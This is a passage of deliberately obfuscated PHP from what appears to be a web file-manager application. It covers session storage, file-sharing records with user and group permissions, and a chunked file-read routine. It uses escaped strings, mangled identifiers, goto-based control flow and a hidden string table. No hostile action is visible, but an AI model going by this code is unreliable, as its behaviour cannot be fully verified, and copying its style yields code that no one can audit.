Exception("\x69\x6f\x46\x69\154\145\x52\x65\141\x64\40\x65\x72\162\x6f\162\x21\x20\x73\x74\x61\x72\x74\x3d{$d±©Ñ§ƒ°˜}\73\x6c\145\x6e\147\164\x68\x3d{$a’ÄŞƒ‡ÜÚ}\73\x20\x73\151\x7a\x65\x3d{$B¦¯ÆŞ«Ÿ¬}\x3b"); } goto A›šµå°ë; aêÛÙÈ³óè: foreach ($d‹ëÏÍ¾š© as $E‰ÎÊÆ«Ğ => $a°„Š¢ö‘¦) { $E‰ÎÊÆ«Ğ = intval($E‰ÎÊÆ«Ğ); $AÇ‰ª¤¯ÄÄ = $E‰ÎÊÆ«Ğ + strlen($a°„Š¢ö‘¦); if ($d±©Ñ§ƒ°˜ >= $AÇ‰ª¤¯ÄÄ) { continue; } if ($d±©Ñ§ƒ°˜ >= $E‰ÎÊÆ«Ğ && $d±©Ñ§ƒ°˜ + $a’ÄŞƒ‡ÜÚ <= $AÇ‰ª¤¯ÄÄ) { return substr($a°„Š¢ö‘¦, $d±©Ñ§ƒ°˜ - $E‰ÎÊÆ«Ğ, $a’ÄŞƒ‡ÜÚ); } break; } if (count($d‹ëÏÍ¾š©) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($FÅ÷—¥ğÁà[1423], $FÅ÷—¥ğÁà[1424] . count($d‹ëÏÍ¾š©) . "\x3b\163\x74\x61\x72\x74\x3d{$d±©Ñ§ƒ°˜}\x2c\154\145\x6e\147\x74\x68\75{$a’ÄŞƒ‡ÜÚ}\x3b\160\157\163\145\72{$E‰ÎÊÆ«Ğ}\176{$AÇ‰ª¤¯ÄÄ}"); throw new Exception($FÅ÷—¥ğÁà[1425]); } $Fº·ÍØ÷›Ÿ = intval($d±©Ñ§ƒ°˜ / $CŒÜµÍéğ¸) * $CŒÜµÍéğ¸; goto DÉøŒÈ‘›Ç; A›šµå°ë: $CŒÜµÍéğ¸ = 64 * 1024; $d‹ëÏÍ¾š© =& self::$_chunkBuffer[$this->path]; if (!$d‹ëÏÍ¾š©) { $d‹ëÏÍ¾š© = array(); } goto Cø•…•Ú”Ã; a…‘¨”ÀÚê: $FÅ÷—¥ğÁà =& $_SERVER[Ö‘Øù]; $B¦¯ÆŞ«Ÿ¬ = $this->info[$FÅ÷—¥ğÁà[78]]; $cÈìÏÙÈ–ê = $d±©Ñ§ƒ°˜; goto Eæ®çÉÚù¡; AØíïóš´×: } private function log($eíÌ”ğš, $a¶ Ö…‹µö) { $BÎ¿ÌáìÜÑ =& $_SERVER[Ö‘Øù]; $DƒÂ–”™¶‡ = timeFloat() - $this->timeStart; write_log(sprintf($BÎ¿ÌáìÜÑ[1426], $eíÌ”ğš, $this->info[$BÎ¿ÌáìÜÑ[28]], $DƒÂ–”™¶‡, $a¶ Ö…‹µö), $BÎ¿ÌáìÜÑ[1112]); } } goto d³Ô­¤óöÑ; aÙ©ğòöãÙ: class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\164\145\155\137\x73\145\163\x73\x69\157\156"; public function get($Eìò‡éĞ¯) { $b»É÷²Ñ‡Š =& $_SERVER[Ö‘Øù]; $bµêÓÊÎÇ = $this->where(array($b»É÷²Ñ‡Š[1859] => $Eìò‡éĞ¯))->find(); if (!is_array($bµêÓÊÎÇ)) { return !1; } return $bµêÓÊÎÇ[$b»É÷²Ñ‡Š[748]]; } public function set($EÁº¨†ù, $EïöŠùÇƒç, $a’›Ÿ‰½Œš = 3600) { $d›æÁÃ§­ =& $_SERVER[Ö‘Øù]; $E¥è¹æç‚ = array($d›æÁÃ§­[1859] => $EÁº¨†ù, $d›æÁÃ§­[1768] => $EïöŠùÇƒç, $d›æÁÃ§­[1860] => $a’›Ÿ‰½Œš + time()); if (Session::get($d›æÁÃ§­[1861])) { $E¥è¹æç‚[$d›æÁÃ§­[1561]] = Session::get($d›æÁÃ§­[1861]); } else { $E¥è¹æç‚[$d›æÁÃ§­[1561]] = 0; } if ($this->get($EÁº¨†ù)) { return $this->where(array($d›æÁÃ§­[1859] => $EÁº¨†ù))->save($E¥è¹æç‚); } else { return $this->add($E¥è¹æç‚, array(), !0); } } public function remove($fÛØãŞÛ‘Ï) { return $this->where(array($_SERVER[Ö‘Øù][1859] => $fÛØãŞÛ‘Ï))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Ö‘Øù][1862] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\141\162\x65"; protected $dataAuto = array(array("\155\157\144\151\146\171\124\x69\155\145", "\164\151\x6d\x65", "\151\156\x73\145\x72\164\x2c\x75\160\144\141\x74\x65", "\146\x75\x6e\x63\x74\151\157\156"), array("\x63\x72\145\141\164\145\x54\151\155\145", "\164\x69\x6d\x65", "\x69\x6e\163\145\162\164", "\x66\x75\156\143\x74\151\157\156"), array("\157\160\x74\151\157\156\163", '', "\151\156\163\145\x72\x74\x2c\165\160\144\x61\164\x65\54\x73\145\154\145\143\164", "\x6a\x73\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($E¯¡Ùø²Ä®) { $C›—Ê«Ê²Æ =& $_SERVER[Ö‘Øù]; $bœ„Øö¾àİ = isset($E¯¡Ùø²Ä®[0]) ? $E¯¡Ùø²Ä®[0] : !1; return array($C›—Ê«Ê²Æ[1863] => array(USER_ID, $C›—Ê«Ê²Æ[1864]), $C›—Ê«Ê²Æ[1806] => array($bœ„Øö¾àİ, $C›—Ê«Ê²Æ[1865])); } protected function listSimple() { $Bè…ç·ì…é = array($_SERVER[Ö‘Øù][1561] => USER_ID); $dˆ‡Â‡—÷™ = $this->field($this->fieldList)->where($Bè…ç·ì…é)->select(); return $dˆ‡Â‡—÷™ ? $dˆ‡Â‡—÷™ : array(); } protected function getInfo($Fñ¯ãŸÊ¾ô, $bî¢ÕŒì…ö = false) { $cäÂ‹³±§® =& $_SERVER[Ö‘Øù]; if ($bî¢ÕŒì…ö) { return $this->_getShareInfo(array($cäÂ‹³±§®[483] => $Fñ¯ãŸÊ¾ô)); } $fÎâïïÔ  = $this->cacheFunctionGet($cäÂ‹³±§®[1808], $Fñ¯ãŸÊ¾ô); return $fÎâïïÔ ; } public function getInfoByHash($AÃõö¾’ÂÕ) { return $this->_getShareInfo(array($_SERVER[Ö‘Øù][485] => $AÃõö¾’ÂÕ)); } public function getInfoByPath($A÷˜ŒœĞ·æ) { $dˆøò×óá‹ =& $_SERVER[Ö‘Øù]; $fò¶’Œ¦§® = array($dˆøò×óá‹[1561] => USER_ID, $dˆøò×óá‹[397] => $A÷˜ŒœĞ·æ); return $this->_getShareInfo($fò¶’Œ¦§®); } public function getInfoBySourcePath($A’Öå¡„˜”) { $F±ğÔªßËÒ =& $_SERVER[Ö‘Øù]; $b½Ëİ»Æ¤Ò = array($F±ğÔªßËÒ[1561] => USER_ID, $F±ğÔªßËÒ[1105] => $A’Öå¡„˜”); return $this->_getShareInfo($b½Ëİ»Æ¤Ò); } private function _getShareInfo($d•—²ô‹½ù) { goto Cªê¬ë…§ù; dãŒİÕŞ¸‰: $d•—²ô‹½ù = array($aÓĞ¹‘‹Ö…[483] => $fº¸ó±¶ŠÀ[$aÓĞ¹‘‹Ö…[483]]); $BÉôœ¨±Áà = $aÓĞ¹‘‹Ö…[1866]; $a·„ÚêÃÑ— = Model($aÓĞ¹‘‹Ö…[591])->order($aÓĞ¹‘‹Ö…[395])->field($BÉôœ¨±Áà)->where($d•—²ô‹½ù)->select(); goto AÍ­Ãôùî˜; AÍ­Ãôùî˜: if ($fº¸ó±¶ŠÀ[$aÓĞ¹‘‹Ö…[397]] == $aÓĞ¹‘‹Ö…[191]) { $fº¸ó±¶ŠÀ[$aÓĞ¹‘‹Ö…[85]] = IO::info($fº¸ó±¶ŠÀ[$aÓĞ¹‘‹Ö…[1105]]); } else { $fº¸ó±¶ŠÀ[$aÓĞ¹‘‹Ö…[85]] = Model($aÓĞ¹‘‹Ö…[1240])->pathInfo($fº¸ó±¶ŠÀ[$aÓĞ¹‘‹Ö…[397]]); } $fº¸ó±¶ŠÀ[$aÓĞ¹‘‹Ö…[1867]] = $a·„ÚêÃÑ—; return $fº¸ó±¶ŠÀ; goto cõª’Â©Œ·; Cªê¬ë…§ù: $aÓĞ¹‘‹Ö… =& $_SERVER[Ö‘Øù]; $fº¸ó±¶ŠÀ = $this->where($d•—²ô‹½ù)->find(); if (!$fº¸ó±¶ŠÀ) { return !1; } goto dãŒİÕŞ¸‰; cõª’Â©Œ·: } protected function getInfoAuth($aŠÓ¯ôÊ©´) { $d­¤¡§Ğ¶ë =& $_SERVER[Ö‘Øù]; $AÈë×õ‰„‘ = $this->getInfo($aŠÓ¯ôÊ©´); $AÈë×õ‰„‘[$d­¤¡§Ğ¶ë[408]] = Model($d­¤¡§Ğ¶ë[497])->authMake($AÈë×õ‰„‘[$d­¤¡§Ğ¶ë[1867]]); return $AÈë×õ‰„‘; } protected function listData($E•‰é†‰±­ = null, $dŠÖÄ— Ï = 300) { $b„‰¯‰®–š =& $_SERVER[Ö‘Øù]; $CÔ“œª† = array(array($b„‰¯‰®–š[488] => array($b„‰¯‰®–š[1005], 0), $b„‰¯‰®–š[490] => array($b„‰¯‰®–š[1005], 0), $b„‰¯‰®–š[1868] => $b„‰¯‰®–š[1822])); if ($E•‰é†‰±­ == $b„‰¯‰®–š[1869]) { $CÔ“œª† = array($b„‰¯‰®–š[488] => 1); } else { if ($E•‰é†‰±­ == $b„‰¯‰®–š[1090]) { $CÔ“œª† = array($b„‰¯‰®–š[490] => 1); } } $CÔ“œª†[$b„‰¯‰®–š[1561]] = USER_ID; $eùğ¢¥·¸½ = $this->where($CÔ“œª†)->selectPage($dŠÖÄ— Ï); return $eùğ¢¥·¸½; } protected function listToMe($dæ³˜×î”É = 300) { goto bô¶Ôµ×²ø; cğÊˆå…âù: if ($c—–æµ¢Ø™) { $a…ê¤´Æ• = array(array($aå¿ó¯‰Ì’[575] => SourceModel::TYPE_USER, $aå¿ó¯‰Ì’[499] => USER_ID), array($aå¿ó¯‰Ì’[575] => SourceModel::TYPE_GROUP, $aå¿ó¯‰Ì’[499] => array($aå¿ó¯‰Ì’[7], $c—–æµ¢Ø™)), $aå¿ó¯‰Ì’[1868] => $aå¿ó¯‰Ì’[1822]); } $D÷çÃ¸¤ì¦ = Model($aå¿ó¯‰Ì’[591])->where($a…ê¤´Æ•)->selectPage($dæ³˜×î”É); $Eé¸àÔ¥Œ = array_to_keyvalue_group($D÷çÃ¸¤ì¦[$aå¿ó¯‰Ì’[367]], $aå¿ó¯‰Ì’[483]); goto cå»¡÷†¥„; cå»¡÷†¥„: if (!$Eé¸àÔ¥Œ) { return $D÷çÃ¸¤ì¦; } $cÎ¼÷ÕµÛÁ = $aå¿ó¯‰Ì’[1871]; $a…ê¤´Æ• = array($aå¿ó¯‰Ì’[483] => array($aå¿ó¯‰Ì’[413], array_keys($Eé¸àÔ¥Œ)), $aå¿ó¯‰Ì’[1561] => array($aå¿ó¯‰Ì’[1007], $aå¿ó¯‰Ì’[191])); goto D‚®ëÈ“ó§; d¼©ƒßº†ˆ: $d‡Ö‚ä†©¦ = array($aå¿ó¯‰Ì’[1872] => $EæÖãù­öÁ, $aå¿ó¯‰Ì’[1873] => $D÷çÃ¸¤ì¦[$aå¿ó¯‰Ì’[364]]); return $d‡Ö‚ä†©¦; goto b˜Í·ƒšÕß; D‚®ëÈ“ó§: $EæÖãù­öÁ = $this->field($cÎ¼÷ÕµÛÁ)->where($a…ê¤´Æ•)->select(); foreach ($EæÖãù­öÁ as $Cöáƒø™µ© => &$B§Ôóİæ²) { $B§Ôóİæ²[$aå¿ó¯‰Ì’[1867]] = $Eé¸àÔ¥Œ[$B§Ôóİæ²[$aå¿ó¯‰Ì’[483]]]; } unset($B§Ôóİæ²); goto d¼©ƒßº†ˆ; bô¶Ôµ×²ø: $aå¿ó¯‰Ì’ =& $_SERVER[Ö‘Øù]; $c—–æµ¢Ø™ = Model($aå¿ó¯‰Ì’[1870])->userGroupParents(USER_ID); $a…ê¤´Æ• = array($aå¿ó¯‰Ì’[575] => SourceModel::TYPE_USER, $aå¿ó¯‰Ì’[499] => USER_ID); goto cğÊˆå…âù; b˜Í·ƒšÕß: } protected function shareAdd($C‹æ°Ê­¨ğ, $fÒšîâƒÃ) { $e®¬ÉÖ²•Ÿ =& $_SERVER[Ö‘Øù]; $E’Íôƒº = $this->_addShareData($C‹æ°Ê­¨ğ, $fÒšîâƒÃ); if (!empty($fÒšîâƒÃ[$e®¬ÉÖ²•Ÿ[1874]])) { $this->_shareAuthSet($E’Íôƒº, $fÒšîâƒÃ[$e®¬ÉÖ²•Ÿ[1874]]); } $this->shareEventAdd($C‹æ°Ê­¨ğ, $fÒšîâƒÃ, $e®¬ÉÖ²•Ÿ[1093]); return $E’Íôƒº; } protected function shareAddSystem($CğìÊ‘¦İ, $c™„ÁÌ–Êğ) { $b˜ƒµÜÛÁÕ =& $_SERVER[Ö‘Øù]; $AáÕ°¦‡õ = $this->_addShareData($CğìÊ‘¦İ, $c™„ÁÌ–Êğ, $b˜ƒµÜÛÁÕ[1205]); $this->_shareAuthSet($AáÕ°¦‡õ, $c™„ÁÌ–Êğ[$b˜ƒµÜÛÁÕ[1874]]); return $AáÕ°¦‡õ; } private function shareEventAdd($DÙ¨õ’¢ÆÎ, $A—Ã¹¹‡ôò, $dÊÒƒò… = "\141\144\144") { goto Bîê’²æÉö; aÄµåãÊê: Model($F®™ê˜„[559])->eventShare($DÙ¨õ’¢ÆÎ, $D¯ƒ÷–ÜØ¸); return; goto Dë›‡È£¡Ë; B¿áášï¶÷: if ($bë²’ÓÄ«ö[$F®™ê˜„[488]] == $F®™ê˜„[87] && $A—Ã¹¹‡ôò[$F®™ê˜„[488]] == $F®™ê˜„[191]) { $D¯ƒ÷–ÜØ¸ = $F®™ê˜„[1878]; } if ($bë²’ÓÄ«ö[$F®™ê˜„[490]] == $F®™ê˜„[191] && $A—Ã¹¹‡ôò[$F®™ê˜„[490]] == $F®™ê˜„[87]) { $D¯ƒ÷–ÜØ¸ = $F®™ê˜„[1876]; } if ($bë²’ÓÄ«ö[$F®™ê˜„[490]] == $F®™ê˜„[87] && $A—Ã¹¹‡ôò[$F®™ê˜„[490]] == $F®™ê˜„[191]) { $D¯ƒ÷–ÜØ¸ = $F®™ê˜„[1879]; } goto aÄµåãÊê; eŠˆ²šÔÃ•: $bë²’ÓÄ«ö = $this->getInfoByPath($DÙ¨õ’¢ÆÎ); $D¯ƒ÷–ÜØ¸ = $F®™ê˜„[1877]; if ($bë²’ÓÄ«ö[$F®™ê˜„[488]] == $F®™ê˜„[191] && $A—Ã¹¹‡ôò[$F®™ê˜„[488]] == $F®™ê˜„[87]) { $D¯ƒ÷–ÜØ¸ = $F®™ê˜„[1875]; } goto B¿áášï¶÷; Bîê’²æÉö: $F®™ê˜„ =& $_SERVER[Ö‘Øù]; if (!$DÙ¨õ’¢ÆÎ || $DÙ¨õ’¢ÆÎ == $F®™ê˜„[191]) { return; } if ($dÊÒƒò… == $F®™ê˜„[1093]) { if ($A—Ã¹¹‡ôò[$F®™ê˜„[488]] == $F®™ê˜„[87]) { Model($F®™ê˜„[559])->eventShare($DÙ¨õ’¢ÆÎ, $F®™ê˜„[1875]); } if ($A—Ã¹¹‡ôò[$F®™ê˜„[490]] == $F®™ê˜„[87]) { Model($F®™ê˜„[559])->eventShare($DÙ¨õ’¢ÆÎ, $F®™ê˜„[1876]); } return; } goto eŠˆ²šÔÃ•; Dë›‡È£¡Ë: } private function _addShareData($fÅÍè¹—†æ, $cùé—Œ†ÁÃ = array(), $E‚˜Ïšˆì = false) { goto dÎ¹ˆÆæ¹ô; E”´ËŸÎºØ: $this->where(array($dŒğ›µÖŸÎ[482] => $DŞßãÇŒå©))->save($aø‚°é³”); return $DŞßãÇŒå©; goto b…¯÷¾¾Û; c—ˆ•÷„ˆ’: if (!$cùé—Œ†ÁÃ[$dŒğ›µÖŸÎ[1464]]) { $cùé—Œ†ÁÃ[$dŒğ›µÖŸÎ[1464]] = $dƒÆà–Å„[$dŒğ›µÖŸÎ[28]]; } $D¹Çƒ‹ëĞà = array($dŒğ›µÖŸÎ[1552] => $bÊ„ªêŞƒê, $dŒğ›µÖŸÎ[412] => $fÅÍè¹—†æ, $dŒğ›µÖŸÎ[1464] => $dŒğ›µÖŸÎ[33], $dŒğ›µÖŸÎ[488] => 0, $dŒğ›µÖŸÎ[490] => 0, $dŒğ›µÖŸÎ[1105] => $dŒğ›µÖŸÎ[33], $dŒğ›µÖŸÎ[305] => $dŒğ›µÖŸÎ[33], $dŒğ›µÖŸÎ[884] => $dŒğ›µÖŸÎ[33], $dŒğ›µÖŸÎ[1881] => 0, $dŒğ›µÖŸÎ[1882] => 0, $dŒğ›µÖŸÎ[491] => 0, $dŒğ›µÖŸÎ[492] => $dŒğ›µÖŸÎ[33], $dŒğ›µÖŸÎ[485] => $dŒğ›µÖŸÎ[33]); $D¢ô°Ä’º = explode($dŒğ›µÖŸÎ[47], $dŒğ›µÖŸÎ[1883]); goto dö£¹éÆÏ; CçíìÕİš¤: if ($fÅÍè¹—†æ == 0) { $f­ÉçÒªğ = array($dŒğ›µÖŸÎ[1880] => $cùé—Œ†ÁÃ[$dŒğ›µÖŸÎ[1105]], $dŒğ›µÖŸÎ[1552] => $bÊ„ªêŞƒê); } if ($CĞ•†ËæŠ = $this->where($f­ÉçÒªğ)->find()) { return $CĞ•†ËæŠ[$dŒğ›µÖŸÎ[483]]; } if ($fÅÍè¹—†æ == 0) { $dƒÆà–Å„ = array($dŒğ›µÖŸÎ[28] => get_path_this($cùé—Œ†ÁÃ[$dŒğ›µÖŸÎ[76]])); } else { $dƒÆà–Å„ = Model($dŒğ›µÖŸÎ[825])->sourceInfo($fÅÍè¹—†æ); if (!$dƒÆà–Å„) { return !1; } } goto c—ˆ•÷„ˆ’; dö£¹éÆÏ: foreach ($D¢ô°Ä’º as $D±¤‹Ş‰¯Š) { if (!isset($cùé—Œ†ÁÃ[$D±¤‹Ş‰¯Š])) { continue; } $D¹Çƒ‹ëĞà[$D±¤‹Ş‰¯Š] = $cùé—Œ†ÁÃ[$D±¤‹Ş‰¯Š]; } $DŞßãÇŒå© = $this->add($D¹Çƒ‹ëĞà); $aø‚°é³” = array($dŒğ›µÖŸÎ[485] => short_id($DŞßãÇŒå©)); goto E”´ËŸÎºØ; dÎ¹ˆÆæ¹ô: $dŒğ›µÖŸÎ =& $_SERVER[Ö‘Øù]; $bÊ„ªêŞƒê = $E‚˜Ïšˆì == $dŒğ›µÖŸÎ[1205] ? 0 : USER_ID; $f­ÉçÒªğ = array($dŒğ›µÖŸÎ[412] => $fÅÍè¹—†æ, $dŒğ›µÖŸÎ[1552] => $bÊ„ªêŞƒê); goto CçíìÕİš¤; b…¯÷¾¾Û: } private function _shareAuthSet($C¸Ö‘âò©¶, $bâŠŠ£§“÷) { goto a“˜Š¤î¼; cÏâ¸°÷İ: return $eÉ™äò†àÊ->addAll($E·×Ê°…¡ä, array(), !0); goto f­óÚêÆ¹Ï; a“˜Š¤î¼: $eÃ­”¡¥‚¢ =& $_SERVER[Ö‘Øù]; if (!is_array($bâŠŠ£§“÷)) { return !1; } $eÉ™äò†àÊ = Model($eÃ­”¡¥‚¢[1834]); goto a²ØëÅˆ¢õ; a²ØëÅˆ¢õ: $eÉ™äò†àÊ->where(array($eÃ­”¡¥‚¢[483] => $C¸Ö‘âò©¶))->delete(); $E·×Ê°…¡ä = array(); foreach ($bâŠŠ£§“÷ as $dì˜çá†¼ò) { $Cêô—ğ§ = SourceModel::TYPE_USER; if ($dì˜çá†¼ò[$eÃ­”¡¥‚¢[406]] == SourceModel::TYPE_GROUP) { $Cêô—ğ§ = SourceModel::TYPE_GROUP; } $b†«ÉÖ‘’ñ = array($eÃ­”¡¥‚¢[483] => $C¸Ö‘âò©¶, $eÃ­”¡¥‚¢[406] => $Cêô—ğ§, $eÃ­”¡¥‚¢[499] => intval($dì˜çá†¼ò[$eÃ­”¡¥‚¢[499]]), $eÃ­”¡¥‚¢[1830] => 0, $eÃ­”¡¥‚¢[1884] => -1); if ($dì˜çá†¼ò[$eÃ­”¡¥‚¢[1830]]) { $b†«ÉÖ‘’ñ[$eÃ­”¡¥‚¢[1830]] = $dì˜çá†¼ò[$eÃ­”¡¥‚¢[1830]]; } else { if ($dì˜çá†¼ò[$eÃ­”¡¥‚¢[1884]]) { $b†«ÉÖ‘’ñ[$eÃ­”¡¥‚¢[1884]] = $dì˜çá†¼ò[$eÃ­”¡¥‚¢[1884]]; } } $E·×Ê°…¡ä[] = $b†«ÉÖ‘’ñ; } goto cÏâ¸°÷İ; f­óÚêÆ¹Ï: } public function numViewAdd($bˆš‡ó°œ) { $Däã»ßÕàˆ =& $_SERVER[Ö‘Øù]; $EŒ·¶…à‘ï = array($Däã»ßÕàˆ[482] => $bˆš‡ó°œ); $this->where($EŒ·¶…à‘ï)->setAdd($Däã»ßÕàˆ[1881]); } public function numDownloadAdd($bç’³´¶«) { $aŸäÈİçÇ´ =& $_SERVER[Ö‘Øù]; $E…ƒ¼’Ùéº = array($aŸäÈİçÇ´[482] => $bç’³´¶«); $this->where($E…ƒ¼’Ùéº)->setAdd($aŸäÈİçÇ´[1882]); } protected function shareEdit($BÚ®…ïÖ ‡, $CÇí‰¼±È) { goto d‘•ÑùÖ£‡; DÑŸÂğöİ¢: foreach ($B”ÚŠ¾¦í as $B¢¸Ëëî¶‡) { if (!array_key_exists($B¢¸Ëëî¶‡, $CÇí‰¼±È)) { continue; } $D…‡‘Ù‘Ë„[$B¢¸Ëëî¶‡] = $CÇí‰¼±È[$B¢¸Ëëî¶‡]; } $this->shareEventAdd($cƒùÖÀÄ¨[$F¼íÊ¡ßÈ[397]], $CÇí‰¼±È, $F¼íÊ¡ßÈ[1697]); $this->where(array($F¼íÊ¡ßÈ[482] => $BÚ®…ïÖ ‡))->save($D…‡‘Ù‘Ë„); goto FÂäÏ·Ñ¯‡; d‘•ÑùÖ£‡: $F¼íÊ¡ßÈ =& $_SERVER[Ö‘Øù]; $cƒùÖÀÄ¨ = $this->getInfo($BÚ®…ïÖ ‡); if (!$cƒùÖÀÄ¨) { return !1; } goto fÑ¼ŠØîØ; fÑ¼ŠØîØ: $this->_checkLinkShare($CÇí‰¼±È, $cƒùÖÀÄ¨); $D…‡‘Ù‘Ë„ = array(); $B”ÚŠ¾¦í = explode($F¼íÊ¡ßÈ[47], $F¼íÊ¡ßÈ[1885]); goto DÑŸÂğöİ¢; FÂäÏ·Ñ¯‡: if (isset($CÇí‰¼±È[$F¼íÊ¡ßÈ[1874]])) { $this->_shareAuthSet($BÚ®…ïÖ ‡, $CÇí‰¼±È[$F¼íÊ¡ßÈ[1874]]); } return !0; goto b¹À‘Ü¶®; b¹À‘Ü¶®: } private function _checkLinkShare($còéŞ¨‰¸Ø, $bÕ¥¹¹æÁ„) { goto EñÑ„¬”„; EñÑ„¬”„: $d¬ïõ§Ä¯à =& $_SERVER[Ö‘Øù]; if ($còéŞ¨‰¸Ø[$d¬ïõ§Ä¯à[488]] != $d¬ïõ§Ä¯à[87]) { return; } $C¡ñ¹Â·Áî = $bÕ¥¹¹æÁ„[$d¬ïõ§Ä¯à[85]][$d¬ïõ§Ä¯à[397]]; goto A÷×º‰ª¦Ñ; CÀµâ‡ÀÂ¸: $d í‡¾š = $this->shareFileMeta($Bî‹‰ªÑ¾Ã[$d¬ïõ§Ä¯à[462]]); if (isset($d í‡¾š[$d¬ïõ§Ä¯à[372]]) && $d í‡¾š[$d¬ïõ§Ä¯à[372]] == $d¬ïõ§Ä¯à[87]) { show_json(LNG($d¬ïõ§Ä¯à[1888]), !1); } goto C¤…è…«‚·; A÷×º‰ª¦Ñ: if ($bÕ¥¹¹æÁ„[$d¬ïõ§Ä¯à[85]][$d¬ïõ§Ä¯à[29]] != $d¬ïõ§Ä¯à[193]) { $dâá¶ÚØßâ = $this->_folderReport($C¡ñ¹Â·Áî); if (!$dâá¶ÚØßâ) { return; } show_json(LNG($d¬ïõ§Ä¯à[1886]) . $d¬ïõ§Ä¯à[1887] . $dâá¶ÚØßâ, !1); } $Bî‹‰ªÑ¾Ã = Model($d¬ïõ§Ä¯à[825])->fileInfoGet($bÕ¥¹¹æÁ„[$d¬ïõ§Ä¯à[85]][$d¬ïõ§Ä¯à[397]]); if (!$Bî‹‰ªÑ¾Ã) { return; } goto CÀµâ‡ÀÂ¸; C¤…è…«‚·: } private function _folderReport($B›µÊÓ¸ë´) { goto b¶ä•Ë«™; b¶ä•Ë«™: $FÉœ¦„ÈÃ± =& $_SERVER[Ö‘Øù]; $A¼¬……çÍÎ = array($FÉœ¦„ÈÃ±[462] => array($FÉœ¦„ÈÃ±[1005], 0), $FÉœ¦„ÈÃ±[743] => 3); $eàÃáÍÓÈ‡ = Model($FÉœ¦„ÈÃ±[1889])->where($A¼¬……çÍÎ)->field($FÉœ¦„ÈÃ±[462])->select(); goto aÇƒŞéÌ¹…; böÖ¼ÈÛ¼Ç: $Fë£è”•µí = substr($aÓ£á‰®ª[$FÉœ¦„ÈÃ±[516]], strpos($aÓ£á‰®ª[$FÉœ¦„ÈÃ±[516]], $A’®„¶°ê)); $A¼¬……çÍÎ = array($FÉœ¦„ÈÃ±[397] => array($FÉœ¦„ÈÃ±[7], trim($Fë£è”•µí, $FÉœ¦„ÈÃ±[47]))); $bäëØÄØŸŸ = Model($FÉœ¦„ÈÃ±[825])->where($A¼¬……çÍÎ)->field($FÉœ¦„ÈÃ±[28])->select(); goto a›İ†Ñ”Ï; aÇƒŞéÌ¹…: if (!$eàÃáÍÓÈ‡) { return !1; } $eàÃáÍÓÈ‡ = array_to_keyvalue($eàÃáÍÓÈ‡, $FÉœ¦„ÈÃ±[33], $FÉœ¦„ÈÃ±[462]); $A’®„¶°ê = $FÉœ¦„ÈÃ±[47] . $B›µÊÓ¸ë´ . $FÉœ¦„ÈÃ±[47]; goto FÇÚÈò¡Ï”; FÇÚÈò¡Ï”: $A¼¬……çÍÎ = array($FÉœ¦„ÈÃ±[462] => array($FÉœ¦„ÈÃ±[7], $eàÃáÍÓÈ‡), $FÉœ¦„ÈÃ±[516] => array($FÉœ¦„ÈÃ±[381], "\45{$A’®„¶°ê}\45"), $FÉœ¦„ÈÃ±[425] => 0); $aÓ£á‰®ª = Model($FÉœ¦„ÈÃ±[825])->where($A¼¬……çÍÎ)->field($FÉœ¦„ÈÃ±[1890])->find(); if (!$aÓ£á‰®ª) { return !1; } goto böÖ¼ÈÛ¼Ç; a›İ†Ñ”Ï: $dí¦³™À† = array_to_keyvalue($bäëØÄØŸŸ, $FÉœ¦„ÈÃ±[33], $FÉœ¦„ÈÃ±[28]); $dí¦³™À†[] = $aÓ£á‰®ª[$FÉœ¦„ÈÃ±[28]]; return implode($FÉœ¦„ÈÃ±[8], $dí¦³™À†); goto Aäæ¢­«Ç; Aäæ¢­«Ç: } protected function remove($FåÛ©æ¬æã) { goto DˆêÜ©ƒ; DˆêÜ©ƒ: $f™¾È’¶§ =& $_SERVER[Ö‘Øù]; if (is_array($FåÛ©æ¬æã)) { $FåÛ©æ¬æã = array($f™¾È’¶§[7], $FåÛ©æ¬æã); } $aî…µÊ³‰¬ = array($f™¾È’¶§[483] => $FåÛ©æ¬æã); goto D‰ß¢·‘‡õ; BÃáÅãÕÍ²: for ($Cµ‹ˆÔ‰ùé = 0; $Cµ‹ˆÔ‰ùé < count($b½Á¤çÜ¥“); $Cµ‹ˆÔ‰ùé++) { $BìÜ¤–ƒ²˜ = $this->getInfo($b½Á¤çÜ¥“[$Cµ‹ˆÔ‰ùé]); if ($BìÜ¤–ƒ²˜[$f™¾È’¶§[490]] == $f™¾È’¶§[87]) { Model($f™¾È’¶§[559])->eventShare($BìÜ¤–ƒ²˜[$f™¾È’¶§[397]], $f™¾È’¶§[1879]); } if ($BìÜ¤–ƒ²˜[$f™¾È’¶§[488]] == $f™¾È’¶§[87]) { Model($f™¾È’¶§[559])->eventShare($BìÜ¤–ƒ²˜[$f™¾È’¶§[397]], $f™¾È’¶§[1878]); } } return $E©ô®†Óé; goto cò„òìÔ¶Ù; D‰ß¢·‘‡õ: $E©ô®†Óé = $this->where($aî…µÊ³‰¬)->delete(); if ($E©ô®†Óé) { Model($f™¾È’¶§[591])->where(array($f™¾È’¶§[483] => $FåÛ©æ¬æã))->delete(); } $b½Á¤çÜ¥“ = is_array($FåÛ©æ¬æã) ? $FåÛ©æ¬æã[1] : array($FåÛ©æ¬æã); goto BÃáÅãÕÍ²; cò„òìÔ¶Ù: } protected function removeBySource($dÊ´ˆÇ¶ƒÅ) { goto EŞ…ê»À™š; EŞ…ê»À™š: $DË©ö‘‘ø =& $_SERVER[Ö‘Øù]; $bÌå¹·Å‘¸ = array($DË©ö‘‘ø[412] => array($DË©ö‘‘ø[413], $dÊ´ˆÇ¶ƒÅ)); $bÊÅáñæ’Î = $this->field($DË©ö‘‘ø[483])->where($bÌå¹·Å‘¸)->select(); goto føáİ«·èâ; dø³ÙÜá­Ò: $this->where($bÌå¹·Å‘¸)->delete(); Model($DË©ö‘‘ø[591])->where($bÌå¹·Å‘¸)->delete(); goto aÉŸì Ù­; føáİ«·èâ: $bÊÅáñæ’Î = array_to_keyvalue($bÊÅáñæ’Î, $DË©ö‘‘ø[33], $DË©ö‘‘ø[483]); if (!$bÊÅáñæ’Î) { return; } $bÌå¹·Å‘¸ = array($DË©ö‘‘ø[482] => array($DË©ö‘‘ø[413], $bÊÅáñæ’Î)); goto dø³ÙÜá­Ò; aÉŸì Ù­: } public function listAll($D™„ê‰™‹„) { goto c˜Û·Íñêñ; c˜Û·Íñêñ: $fä°É¹©é¦ =& $_SERVER[Ö‘Øù]; 